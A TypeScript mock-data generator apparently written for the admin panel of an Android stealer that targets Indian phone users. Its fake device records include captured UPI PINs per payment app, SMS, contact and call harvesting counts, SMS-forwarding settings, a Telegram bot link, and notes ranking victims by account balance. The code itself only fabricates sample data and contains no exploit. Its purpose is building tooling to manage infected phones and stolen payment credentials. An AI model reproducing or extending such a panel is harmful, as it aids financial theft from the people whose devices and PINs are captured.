import type { Device } from '@/types'

export function generateMockDevices(): Device[] {
  const devices: Device[] = []
  const manufacturers = ['Samsung', 'Xiaomi', 'Oppo', 'Vivo', 'Realme', 'INFINIX']
  const models = ['Galaxy S21', 'Redmi Note 10', 'A54', 'Y20', 'Narzo 30', 'Infinix X6857B']
  const carriers = ['Airtel', 'Jio', 'Vi India', 'BSNL']
  const appTypes = ['wosexy', 'whatsapp', 'telegram']
  
  for (let i = 0; i < 12; i++) {
    const isDeleted = i < 2
    const isPending = i >= 2 && i < 4
    const isOnline = !isDeleted && !isPending && Math.random() > 0.3
    
    const manufacturer = manufacturers[Math.floor(Math.random() * manufacturers.length)]
    const model = models[Math.floor(Math.random() * models.length)]
    const carrier = carriers[Math.floor(Math.random() * carriers.length)]
    const appType = appTypes[Math.floor(Math.random() * appTypes.length)]
    
    const totalStorage = 107757.96875
    const freeStorage = Math.random() * totalStorage
    const totalRam = 5436.75390625
    const freeRam = Math.random() * totalRam
    
    devices.push({
      device_id: `device_${i + 1}`,
      admin_token: `token_${i + 1}`,
      admin_username: 'admin',
      app_type: appType,
      battery_level: Math.floor(Math.random() * 100),
      battery_state: Math.random() > 0.5 ? 'charging' : 'discharging',
      is_charging: Math.random() > 0.5,
      board: `${manufacturer}-${model}`,
      brand: manufacturer,
      device: `${manufacturer}-${model}`,
      device_name: `${manufacturer} ${model}`,
      display: `${model}-Display`,
      fingerprint: `${manufacturer}/${model}:15/fingerprint`,
      hardware: 'mt6878',
      host: 'srv99186-1010',
      manufacturer,
      model,
      product: `${model}-IN`,
      os_version: `${10 + Math.floor(Math.random() * 6)}`,
      sdk_int: 30 + Math.floor(Math.random() * 5),
      screen_density: 280,
      screen_resolution: '720x1600',
      supported_abis: ['arm64-v8a'],
      total_storage_mb: totalStorage,
      free_storage_mb: freeStorage,
      storage_used_mb: totalStorage - freeStorage,
      storage_percent_free: (freeStorage / totalStorage) * 100,
      total_ram_mb: totalRam,
      free_ram_mb: freeRam,
      ram_used_mb: totalRam - freeRam,
      ram_percent_free: (freeRam / totalRam) * 100,
      network_type: 'Mobile',
      ip_address: `192.0.0.${i + 1}`,
      status: isOnline ? 'online' : 'offline',
      is_online: isOnline,
      is_emulator: false,
      is_rooted: false,
      last_online_update: new Date(Date.now() - Math.random() * 3600000).toISOString(),
      last_ping: isDeleted 
        ? new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString()
        : new Date(Date.now() - Math.random() * 3600000).toISOString(),
      registered_at: new Date(Date.now() - Math.random() * 86400000 * 30).toISOString(),
      updated_at: new Date(Date.now() - Math.random() * 3600000).toISOString(),
      settings: {
        monitoring_enabled: true,
        sms_forward_enabled: false,
        forward_number: null,
      },
      stats: {
        total_sms: isPending ? 0 : Math.floor(Math.random() * 1000),
        total_contacts: Math.floor(Math.random() * 500),
        total_calls: Math.floor(Math.random() * 200),
        last_sms_sync: new Date(Date.now() - Math.random() * 3600000).toISOString(),
        last_contact_sync: new Date(Date.now() - Math.random() * 3600000).toISOString(),
        last_call_sync: new Date(Date.now() - Math.random() * 3600000).toISOString(),
      },
      sim_info: [
        {
          sim_slot: 0,
          subscription_id: 4,
          carrier_name: carrier,
          display_name: carrier,
          phone_number: `+91${Math.floor(Math.random() * 9000000000 + 1000000000)}`,
          country_iso: 'in',
          mcc: '404',
          mnc: '11',
          network_type: 'LTE (4G)',
          sim_state: 'Ready',
          data_enabled: true,
          voice_capable: true,
          sms_capable: true,
        },
      ],
      has_upi: Math.random() > 0.5,
      upi_detected_at: null,
      upi_last_updated_at: new Date(Date.now() - Math.random() * 3600000).toISOString(),
      upi_pins: [
        {
          pin: '123456',
          app_type: 'Google Pay',
          status: 'success',
          detected_at: new Date(Date.now() - Math.random() * 3600000).toISOString(),
        },
      ],
      telegram_bot_id: 1,
      fcm_tokens: [],
      user_id: `user_${i + 1}`,
      is_deleted: isDeleted,
      deleted_at: isDeleted ? new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString() : undefined,
      deleted_sms_ids: isDeleted ? [] : undefined,
      note: i % 3 === 0 ? 'high_balance' : i % 3 === 1 ? 'low_balance' : null,
      note_text: i % 3 === 0 ? 'Account has good balance' : i % 3 === 1 ? 'Need recharge' : null,
    })
  }
  
  return devices
}
